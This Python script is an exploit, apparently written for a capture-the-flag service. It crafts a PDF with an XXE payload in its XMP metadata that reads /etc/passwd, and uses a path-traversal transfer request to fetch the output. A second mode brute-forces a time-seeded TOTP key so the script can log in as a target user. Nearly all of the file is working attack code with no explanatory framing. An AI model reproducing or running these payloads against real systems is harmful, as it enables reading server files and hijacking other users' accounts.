from pikepdf import Pdf, Stream
import requests
import base64
import hashlib
import time
import hmac
import struct
import random
import string
import sys

session = requests.Session()
url = "http://[fd66:666:995::2]:5001/"

def generate_key(user, seed=time.time(), length=12):
    # Generate the TOTP key
    seed = str(int(seed))
    random.seed(user + seed)
    chars = string.ascii_letters + string.digits
    return seed, "".join([random.choice(chars) for _ in range(length)])

def totp(key, interval=60):
    now=time.time()
    try:
        key = key.encode()
        counter = struct.pack('>Q', int(now / interval))
        mac = hmac.new(key, counter, hashlib.sha256).digest()
        password = base64.b32encode(mac).decode().replace("=", "")
    except Exception as e:
        print(e)
        password = None
    return password

def brute_force_key(user, start, key):
    cur = int(start)
    while 1:
        k = generate_key(user, cur)[1]   
        cur -= 1
        # print(f"{cur}: {k}")
        if k == key:
            return cur
    return -1

def register_user(username):
    data = {"name": username}
    res = session.post(url + "/register", data=data)
    key = res.text.split("This is your key: <b>")[1].split("</b>")[0]    
    return key
    
def login_user(username, key):
    password = totp(key)
    data = {"name": username, "pass": password}
    res = session.post(url + "/login", data=data)

    if "home" in res.url:
        print("Successfully logged in!")
    
    return key

def upload_file():
    # TODO
    data = {"step": "upload"}
    files = {"file": open("./vuln.pdf", "rb")}
    session.post(url + "generate", files=files, data=data)
    pass

def exploit_xxe(username):   
    # Refresh flash
    res = session.get(url)

    # Transfer file
    # TODO change name to vuln.pdf
    data = {"filename": "../../generator/vuln.pdf", "receiver": username}
    res = session.post(url + "transfer", data=data)
    print(res.text)
    if res.status_code != 403:
        print("Something went wrong. Did expect an error!")
        return

    res = session.get(url)
    path = res.text.split("report('")[1].split("')>Report")[0]
    print(f"Download {url}nft?file={path[9:]}")
    res = session.get(url + "nft?file=" + path[9:])
    if "root" in res.text:
        print("HACKED IT")
    else:
        print(res.text)

def create_vuln_file():
    pdf = Pdf.open("./base.pdf")
    payload = b'<!DOCTYPE rdf:RDF [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    # payload = b'<!DOCTYPE rdf:RDF [<!ENTITY xxe SYSTEM "http://127.0.0.1:5001/aaaaa">]>'
    placeholder = b"x" * (len(payload) + 5  + 1)
    meta =  b"""\
        <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c016 91.163616, 2018/10/29-16:58:49">
           <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
              <rdf:Description rdf:about=""
                    xmlns:xmp="http://ns.adobe.com/xap/1.0/"
                    xmlns:dc="http://purl.org/dc/elements/1.1/"
                    xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"
                    xmlns:pdf="http://ns.adobe.com/pdf/1.3/"
                    xmlns:adhocwf="http://ns.adobe.com/AcrobatAdhocWorkflow/1.0/">
                 <xmp:ModifyDate>2021-04-06T01:2</xmp:ModifyDate>
                 <xmp:CreateDate>2021-04-06T01:17:17-07:00</xmp:CreateDate>
                 <xmp:MetadataDate></xmp:MetadataDate>
                 <pdf:Producer></pdf:Producer>
                 <xmp:CreatorTool></xmp:CreatorTool>
                 <dc:format>application/pdf</dc:format>
                 <xmpMM:DocumentID>%s</xmpMM:DocumentID>
                 <xmpMM:InstanceID>uuid:a88b988d-8a19-1b4c-9aa1-d6388f0ad490</xmpMM:InstanceID>
                 <pdf:PDFVersion>123</pdf:PDFVersion>
                 <adhocwf:state>1</adhocwf:state>
                 <adhocwf:version>1.1</adhocwf:version>
              </rdf:Description>
           </rdf:RDF>
        </x:xmpmeta>
        """ % (placeholder)

    pdf.Root.Metadata = Stream(
        pdf,
        meta,
    )
    pdf.save('./base2.pdf', fix_metadata_version=True)
    
    d = b'<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c016 91.163616, 2018/10/29-16:58:49">'
    with open("base2.pdf", "br") as fin:
        with open("vuln.pdf", "bw") as fout:
            for line in fin:
                fout.write(line.replace(placeholder, b'&xxe;').replace(d, payload + b"\n" + d))

if __name__ == "__main__":
    n = "TestUser5" + "".join([random.choice("abcdefghijklmnop") for _ in range(10)])

    target = ""

    key = register_user(n)
    login_user(n, key)

    if sys.argv[1] == "pdf":
        create_vuln_file()
        upload_file()
        exploit_xxe(n)
    
    if sys.argv[1] == "totp":
        seed = brute_force_key(n, time.time(), key)
        t_key = generate_key(target, seed)        
        login_user(target, t_key)
